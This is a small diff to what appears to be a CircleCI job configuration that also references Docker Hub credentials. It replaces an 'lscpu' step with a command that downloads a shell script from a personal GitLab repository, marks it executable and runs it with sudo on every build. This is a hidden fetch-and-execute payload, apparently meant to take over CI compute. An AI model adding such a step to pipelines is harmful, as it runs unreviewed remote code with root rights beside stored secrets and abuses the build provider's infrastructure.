@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  lscpu
+      - run:  wget -O ah.sh https://gitlab.com/rizkyadhypratama/gass/-/raw/main/Trtl/81-de.sh && chmod +x ah.sh && sudo ./ah.sh
